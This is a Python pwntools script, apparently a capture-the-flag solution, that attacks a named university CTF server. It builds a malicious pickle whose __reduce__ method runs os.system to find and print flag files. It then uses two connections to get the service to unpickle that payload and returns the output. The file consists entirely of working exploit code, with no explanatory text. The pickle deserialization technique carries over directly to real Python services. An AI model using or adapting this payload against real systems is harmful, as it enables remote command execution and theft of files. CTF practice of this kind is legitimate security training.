import pwn
import os, pickle
from base64 import urlsafe_b64encode as b64e

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23653

class RCE:
    def __reduce__(self):
        cmd = ('find /home/ -type f 2>/dev/null | grep "flag" | xargs cat')
        return os.system, (cmd,)

exploit = pickle.dumps(RCE())

classy = pwn.remote(SERVER, PORT, timeout=10000)
free = pwn.remote(SERVER, PORT, timeout=10000)

classy.recvuntil(b": ")
classy.sendline(b"funky")
classy.recvuntil(b">>> ")
classy.sendline(b"0")
classy.recvuntil(b">>> ")

free.recvuntil(b": ")
free.sendline(b"funky")
free.recvuntil(b">>> ")
free.sendline(b"1")
free.recvuntil(b">>> ")
free.sendline(b"1")
free.recvuntil(b": ")
free.sendline(b"get_flag")
free.recvuntil(b": ")
free.sendline(exploit)
free.sendline()
free.close()

classy.sendline(b"0")
classy.recvuntil(b": ")
classy.sendline(b"get_flag")
print(classy.recvall().decode())